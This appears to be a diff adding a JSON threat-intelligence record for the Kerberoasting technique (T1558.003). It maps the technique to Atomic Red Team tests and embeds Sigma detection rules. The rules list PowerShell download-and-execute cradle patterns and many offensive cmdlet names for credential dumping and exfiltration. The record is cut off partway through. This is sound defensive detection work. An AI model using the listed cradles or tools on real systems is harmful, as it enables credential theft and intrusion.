@@ -1,0 +1,413 @@
+{
+    "id": "T1558.003",
+    "name": "Kerberoasting",
+    "description": "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015)\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\nThis same attack could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)\nCracked hashes may enable [Persistence](TA0003), [Privilege Escalation](TA0004), and [Lateral Movement](TA0008) via access to [Valid Accounts](T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
+    "platforms": "Windows",
+    "kill_chain_phases": "Credential Access",
+    "data_sources": "Active Directory: Active Directory Credential Request",
+    "detection": "Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: AdSecurity Cracking Kerberos Dec 2015)",
+    "url": "https://attack.mitre.org/techniques/T1558/003",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1558.003",
+                "atomic_attack_guid": "29094950-2c96-4cbd-b5e4-f7c65079678f",
+                "atomic_attack_name": "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PowerShell Download and Execution Cradles",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml",
+                        "remote_content": "title: PowerShell Download and Execution Cradles\nid: 85b0b087-eddf-4a2b-b033-d771fa2b9775\nstatus: test\ndescription: Detects PowerShell download and execution cradles.\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-05-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_download:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    selection_iex:\n        CommandLine|contains:\n            - ';iex $'\n            - '| IEX'\n            - '|IEX '\n            - 'I`E`X'\n            - 'I`EX'\n            - 'IE`X'\n            - 'iex '\n            - 'IEX ('\n            - 'IEX('\n            - 'Invoke-Expression'\n    condition: all of selection_*\nfalsepositives:\n    - Some PowerShell installers were seen using similar combinations. Apply filters accordingly\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invocation_specific.yml",
+                        "remote_content": "title: Suspicious PowerShell Invocations - Specific - ProcessCreation\nid: 536e2947-3729-478c-9903-745aaffe60d2\nrelated:\n    - id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\n      type: obsolete\n    - id: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71\n      type: similar\n    - id: 8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090\n      type: similar\nstatus: test\ndescription: Detects suspicious PowerShell invocation command parameters\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-05\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_convert_b64:\n        CommandLine|contains|all:\n            - '-nop'\n            - ' -w '\n            - 'hidden'\n            - ' -c '\n            - '[Convert]::FromBase64String'\n    selection_iex:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-noni'\n            - '-nop'\n            - ' -c '\n            - 'iex'\n            - 'New-Object'\n    selection_enc:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-ep'\n            - 'bypass'\n            - '-Enc'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'reg'\n            - 'add'\n            - '\\software\\'\n    selection_webclient:\n        CommandLine|contains|all:\n            - 'bypass'\n            - '-noprofile'\n            - '-windowstyle'\n            - 'hidden'\n            - 'new-object'\n            - 'system.net.webclient'\n            - '.download'\n    selection_iex_webclient:\n        CommandLine|contains|all:\n            - 'iex'\n            - 'New-Object'\n            - 'Net.WebClient'\n            - '.Download'\n    filter_chocolatey:\n        CommandLine|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\"\n            - 'Write-ChocolateyWarning'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious PowerShell Download and Execute Pattern",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_susp_download_patterns.yml",
+                        "remote_content": "title: Suspicious PowerShell Download and Execute Pattern\nid: e6c54d94-498c-4562-a37c-b469d8e9a275\nrelated:\n    - id: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\n      type: derived\nstatus: test\ndescription: Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)\nreferences:\n    - https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70\n    - https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-28\nmodified: 2022-03-01\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: # make sure that your backend applies the strings case-insensitive\n            - 'IEX ((New-Object Net.WebClient).DownloadString'\n            - 'IEX (New-Object Net.WebClient).DownloadString'\n            - 'IEX((New-Object Net.WebClient).DownloadString'\n            - 'IEX(New-Object Net.WebClient).DownloadString'\n            - ' -command (New-Object System.Net.WebClient).DownloadFile('\n            - ' -c (New-Object System.Net.WebClient).DownloadFile('\n    condition: selection\nfalsepositives:\n    - Software installers that pull packages from remote systems and execute them\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Malicious PowerShell Commandlets - ProcessCreation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_malicious_cmdlets.yml",
+                        "remote_content": "title: Malicious PowerShell Commandlets - ProcessCreation\nid: 02030f2f-6199-49ec-b258-ea71b07e03dc\nrelated:\n    - id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\n      type: derived\n    - id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\n      type: similar\nstatus: test\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\nreferences:\n    - https://adsecurity.org/?p=2921\n    - https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n    - https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n    - https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n    - https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n    - https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n    - https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/ # Invoke-TotalExec\n    - https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/ # Invoke-TotalExec\n    - https://github.com/calebstewart/CVE-2021-1675 # Invoke-Nightmare\n    - https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n    - https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n    - https://github.com/HarmJ0y/DAMP\n    - https://github.com/samratashok/nishang\n    - https://github.com/DarkCoderSc/PowerRunAsSystem/\n    - https://github.com/besimorhino/powercat\n    - https://github.com/Kevin-Robertson/Powermad\n    - https://github.com/adrecon/ADRecon\n    - https://github.com/adrecon/AzureADRecon\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\nmodified: 2024-01-25\ntags:\n    - attack.execution\n    - attack.discovery\n    - attack.t1482\n    - attack.t1087\n    - attack.t1087.001\n    - attack.t1087.002\n    - attack.t1069.001\n    - attack.t1069.002\n    - attack.t1069\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Note: Please ensure alphabetical order when adding new entries\n        CommandLine|contains:\n            - 'Add-Exfiltration'\n            - 'Add-Persistence'\n            - 'Add-RegBackdoor'\n            - 'Add-RemoteRegBackdoor'\n            - 'Add-ScrnSaveBackdoor'\n            - 'Check-VM'\n            - 'ConvertTo-Rc4ByteStream'\n            - 'Decrypt-Hash'\n            - 'Disable-ADIDNSNode'\n            - 'Disable-MachineAccount'\n            - 'Do-Exfiltration'\n            - 'Enable-ADIDNSNode'\n            - 'Enable-MachineAccount'\n            - 'Enabled-DuplicateToken'\n            - 'Exploit-Jboss'\n            - 'Export-ADR'\n            - 'Export-ADRCSV'\n            - 'Export-ADRExcel'\n            - 'Export-ADRHTML'\n            - 'Export-ADRJSON'\n            - 'Export-ADRXML'\n            - 'Find-Fruit'\n            - 'Find-GPOLocation'\n            - 'Find-TrustedDocuments'\n            - 'Get-ADIDNS' # Covers: Get-ADIDNSNodeAttribute, Get-ADIDNSNodeOwner, Get-ADIDNSNodeTombstoned, Get-ADIDNSPermission, Get-ADIDNSZone\n            - 'Get-ApplicationHost'\n            - 'Get-ChromeDump'\n            - 'Get-ClipboardContents'\n            - 'Get-FoxDump'\n            - 'Get-GPPPassword'\n            - 'Get-IndexedItem'\n            - 'Get-KerberosAESKey'\n            - 'Get-Keystrokes'\n            - 'Get-LSASecret'\n            - 'Get-MachineAccountAttribute'\n            - 'Get-MachineAccountCreator'\n            - 'Get-PassHashes'\n            - 'Get-RegAlwaysInstallElevated'\n            - 'Get-RegAutoLogon'\n            - 'Get-RemoteBootKey'\n            - 'Get-RemoteCachedCredential'\n            - 'Get-RemoteLocalAccountHash'\n            - 'Get-RemoteLSAKey'\n            - 'Get-RemoteMachineAccountHash'\n            - 'Get-RemoteNLKMKey'\n            - 'Get-RickAstley'\n            - 'Get-Screenshot'\n            - 'Get-SecurityPackages'\n            - 'Get-ServiceFilePermission'\n            - 'Get-ServicePermission'\n            - 'Get-ServiceUnquoted'\n            - 'Get-SiteListPassword'\n            - 'Get-System'\n            - 'Get-TimedScreenshot'\n            - 'Get-UnattendedInstallFile'\n            - 'Get-Unconstrained'\n            - 'Get-USBKeystrokes'\n            - 'Get-VaultCredential'\n            - 'Get-VulnAutoRun'\n            - 'Get-VulnSchTask'\n            - 'Grant-ADIDNSPermission'\n            - 'Gupt-Backdoor'\n            - 'HTTP-Login'\n            - 'Install-ServiceBinary'\n            - 'Install-SSP'\n            - 'Invoke-ACLScanner'\n            - 'Invoke-ADRecon'\n            - 'Invoke-ADSBackdoor'\n            - 'Invoke-AgentSmith'\n            - 'Invoke-AllChecks'\n            - 'Invoke-ARPScan'\n            - 'Invoke-AzureHound'\n            - 'Invoke-BackdoorLNK'\n            - 'Invoke-BadPotato'\n            - 'Invoke-BetterSafetyKatz'\n            - 'Invoke-BypassUAC'\n            - 'Invoke-Carbuncle'\n            - 'Invoke-Certify'\n            - 'Invoke-ConPtyShell'\n            - 'Invoke-CredentialInjection'\n            - 'Invoke-DAFT'\n            - 'Invoke-DCSync'\n            - 'Invoke-DinvokeKatz'\n            - 'Invoke-DllInjection'\n            - 'Invoke-DNSUpdate'\n            - 'Invoke-DomainPasswordSpray'\n            - 'Invoke-DowngradeAccount'\n            - 'Invoke-EgressCheck'\n            - 'Invoke-Eyewitness'\n            - 'Invoke-FakeLogonScreen'\n            - 'Invoke-Farmer'\n            - 'Invoke-Get-RBCD-Threaded'\n            - 'Invoke-Gopher'\n            - 'Invoke-Grouper' # Also Covers Invoke-GrouperX\n            - 'Invoke-HandleKatz'\n            - 'Invoke-ImpersonatedProcess'\n            - 'Invoke-ImpersonateSystem'\n            - 'Invoke-InteractiveSystemPowerShell'\n            - 'Invoke-Internalmonologue'\n            - 'Invoke-Inveigh'\n            - 'Invoke-InveighRelay'\n            - 'Invoke-KrbRelay'\n            - 'Invoke-LdapSignCheck'\n            - 'Invoke-Lockless'\n            - 'Invoke-MalSCCM'\n            - 'Invoke-Mimikatz'\n            - 'Invoke-Mimikittenz'\n            - 'Invoke-MITM6'\n            - 'Invoke-NanoDump'\n            - 'Invoke-NetRipper'\n            - 'Invoke-Nightmare'\n            - 'Invoke-NinjaCopy'\n            - 'Invoke-OfficeScrape'\n            - 'Invoke-OxidResolver'\n            - 'Invoke-P0wnedshell'\n            - 'Invoke-Paranoia'\n            - 'Invoke-PortScan'\n            - 'Invoke-PoshRatHttp' # Also Covers Invoke-PoshRatHttps\n            - 'Invoke-PostExfil'\n            - 'Invoke-PowerDump'\n            - 'Invoke-PowerShellTCP'\n            - 'Invoke-PowerShellWMI'\n            - 'Invoke-PPLDump'\n            - 'Invoke-PsExec'\n            - 'Invoke-PSInject'\n            - 'Invoke-PsUaCme'\n            - 'Invoke-ReflectivePEInjection'\n            - 'Invoke-ReverseDNSLookup'\n            - 'Invoke-Rubeus'\n            - 'Invoke-RunAs'\n            - 'Invoke-SafetyKatz'\n            - 'Invoke-SauronEye'\n            - 'Invoke-SCShell'\n            - 'Invoke-Seatbelt'\n            - 'Invoke-ServiceAbuse'\n            - 'Invoke-ShadowSpray'\n            - 'Invoke-Sharp' # Covers all \"Invoke-Sharp\" variants\n            - 'Invoke-Shellcode'\n            - 'Invoke-SMBScanner'\n            - 'Invoke-Snaffler'\n            - 'Invoke-Spoolsample'\n            - 'Invoke-SpraySinglePassword'\n            - 'Invoke-SSHCommand'\n            - 'Invoke-StandIn'\n            - 'Invoke-StickyNotesExtract'\n            - 'Invoke-SystemCommand'\n            - 'Invoke-Tasksbackdoor'\n            - 'Invoke-Tater'\n            - 'Invoke-Thunderfox'\n            - 'Invoke-ThunderStruck'\n            - 'Invoke-TokenManipulation'\n            - 'Invoke-Tokenvator'\n            - 'Invoke-TotalExec'\n            - 'Invoke-UrbanBishop'\n            - 'Invoke-UserHunter'\n            - 'Invoke-VoiceTroll'\n            - 'Invoke-Whisker'\n            - 'Invoke-WinEnum'\n            - 'Invoke-winPEAS'\n            - 'Invoke-WireTap'\n            - 'Invoke-WmiCommand'\n            - 'Invoke-WMIExec'\n            - 'Invoke-WScriptBypassUAC'\n            - 'Invoke-Zerologon'\n            - 'MailRaider'\n            - 'New-ADIDNSNode'\n            - 'New-DNSRecordArray'\n            - 'New-HoneyHash'\n            - 'New-InMemoryModule'\n            - 'New-MachineAccount'\n            - 'New-SOASerialNumberArray'\n            - 'Out-Minidump'\n            - 'Port-Scan'\n            - 'PowerBreach'\n            - 'powercat '\n            - 'PowerUp'\n            - 'PowerView'\n            - 'Remove-ADIDNSNode'\n            - 'Remove-MachineAccount'\n            - 'Remove-Update'\n            - 'Rename-ADIDNSNode'\n            - 'Revoke-ADIDNSPermission'\n            - 'Set-ADIDNSNode' # Covers: Set-ADIDNSNodeAttribute, Set-ADIDNSNodeOwner\n            - 'Set-MacAttribute'\n            - 'Set-MachineAccountAttribute'\n            - 'Set-Wallpaper'\n            - 'Show-TargetScreen'\n            - 'Start-CaptureServer'\n            - 'Start-Dnscat2'\n            - 'Start-WebcamRecorder'\n            - 'VolumeShadowCopyTools'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Web Download",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
+                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Download Pattern",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml",
+                        "remote_content": "title: PowerShell Download Pattern\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nrelated:\n    - id: e6c54d94-498c-4562-a37c-b469d8e9a275\n      type: derived\nstatus: test\ndescription: Detects a Powershell process that contains download commands in its command line string\nreferences:\n    - https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html\n    - https://lab52.io/blog/winter-vivern-all-summer/\n    - https://hatching.io/blog/powershell-analysis/\nauthor: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2019-01-16\nmodified: 2023-01-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'new-object'\n            - 'net.webclient).'\n            - 'download'\n        CommandLine|contains:\n            - 'string('\n            - 'file('\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
+                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Any Powershell DownloadString",
+                        "rule_link": "https://research.splunk.com/endpoint/4d015ef2-7adf-11eb-95da-acde48001122/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1558.003",
+                "atomic_attack_guid": "e6f4affd-d826-4871-9a62-6c9004b8fe06",
+                "atomic_attack_name": "Extract all accounts in use as SPN using setspn",
+                "platform": "Windows",
+                "splunk_rules": [
+                    {
+                        "rule_name": "ServicePrincipalNames Discovery with SetSPN",
+                        "rule_link": "https://research.splunk.com/endpoint/ae8b3efc-2d2e-11ec-8b57-acde48001122/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1558.003",
+                "atomic_attack_guid": "14625569-6def-4497-99ac-8e7817105b55",
+                "atomic_attack_name": "Rubeus kerberoast",
+                "platform": "Windows",
+                "splunk_rules": [
+                    {
+                        "rule_name": "Rubeus Command Line Parameters",
+                        "rule_link": "https://research.splunk.com/endpoint/cca37478-8377-11ec-b59a-acde48001122/"
+                    },
+                    {
+                        "rule_name": "Windows Command and Scripting Interpreter Hunting Path Traversal",
+                        "rule_link": "https://research.splunk.com/endpoint/d0026380-b3c4-4da0-ac8e-02790063ff6b/"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "12e6d621-194f-4f59-90cc-1959e21e69f7",
+                    "f2877f7f-9a4c-4251-879f-1224e3006bee",
+                    "12827a56-61a4-476a-a9cb-f3068f191073",
+                    "6daac7fc-77d1-449a-a71a-e6b4d59a0e54",
+                    "e96253b8-6b3b-4f90-9e59-3b24b99cf9b4",
+                    "496a0e47-0a33-4dca-b009-9e6ca3591f39",
+                    "44bbff3e-4ca3-452d-a49a-6efa4cafa06f",
+                    "1eeed653-dbc8-4187-ad0c-eeebb20e6599",
+                    "7ec2c172-dceb-4c10-92c9-87c1881b7e18",
+                    "a861d835-af37-4930-bcd6-5b178bfb54df",
+                    "503fe26e-b5f2-4944-a126-eab405cc06e5",
+                    "eca91c7c-9214-47b9-b4c5-cb1d7e4f2350"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "12e6d621-194f-4f59-90cc-1959e21e69f7",
+                        "lookup_data": {
+                            "description": "Detects potential use of Rubeus via registered new trusted logon process",
+                            "raw": "author: Roberto Rodriguez (source), Ilyas Ochkov (rule), oscd.community\ndate: 2019/10/24\ndescription: Detects potential use of Rubeus via registered new trusted logon process\ndetection:\n  condition: selection\n  selection:\n    EventID: 4611\n    LogonProcessName: User32LogonProcesss\nfalsepositives:\n- Unknown\nid: 12e6d621-194f-4f59-90cc-1959e21e69f7\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/10/09\nreferences:\n- https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1\nstatus: test\ntags:\n- attack.lateral_movement\n- attack.privilege_escalation\n- attack.t1558.003\ntitle: Register new Logon Process by Rubeus\n",
+                            "sigma:id": "12e6d621-194f-4f59-90cc-1959e21e69f7",
+                            "title": "Register new Logon Process by Rubeus",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f2877f7f-9a4c-4251-879f-1224e3006bee",
+                        "lookup_data": {
+                            "capec": "CAPEC-509",
+                            "mitre-attack-id": "T1558.003",
+                            "mitre-cti:description": "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n\nThis same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
+                            "mitre-cti:name": "Kerberoasting",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Praetorian'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee', 'type': 'attack-pattern', 'created': '2020-02-11T18:43:38.588Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1558.003', 'url': 'https://attack.mitre.org/techniques/T1558/003'}, {'external_id': 'CAPEC-509', 'source_name': 'capec', 'url': 'https://capec.mitre.org/data/definitions/509.html'}, {'url': 'https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1', 'description': 'EmpireProject. (2016, October 31). Invoke-Kerberoast.ps1. Retrieved March 22, 2018.', 'source_name': 'Empire InvokeKerberoast Oct 2016'}, {'url': 'https://adsecurity.org/?p=2293', 'description': 'Metcalf, S. (2015, December 31). Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain. Retrieved March 22, 2018.', 'source_name': 'AdSecurity Cracking Kerberos Dec 2015'}, {'url': 'https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/', 'description': 'Bani, M. (2018, February 23). Detecting Kerberoasting activity using Azure Security Center. Retrieved March 23, 2018.', 'source_name': 'Microsoft Detecting Kerberoasting Feb 2018'}, {'url': 'https://msdn.microsoft.com/library/ms677949.aspx', 'description': 'Microsoft. (n.d.). Service Principal Names. Retrieved March 22, 2018.', 'source_name': 'Microsoft SPN'}, {'url': 'https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx', 'description': 'Microsoft. (2010, April 13). Service Principal Names (SPNs) SetSPN Syntax (Setspn.exe). Retrieved March 22, 2018.', 'source_name': 'Microsoft SetSPN'}, {'description': 'Medin, T. (2014, November). Attacking Kerberos - Kicking the Guard Dog of Hades. Retrieved March 22, 2018.', 'source_name': 'SANS Attacking Kerberos Nov 2014', 'url': 'https://redsiege.com/kerberoast-slides'}, {'url': 'https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/', 'description': 'Schroeder, W. (2016, November 1). Kerberoasting Without Mimikatz. Retrieved March 23, 2018.', 'source_name': 'Harmj0y Kerberoast Nov 2016'}], 'modified': '2022-03-08T21:52:42.405Z', 'name': 'Kerberoasting', 'description': 'Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \\n\\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\\n\\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus 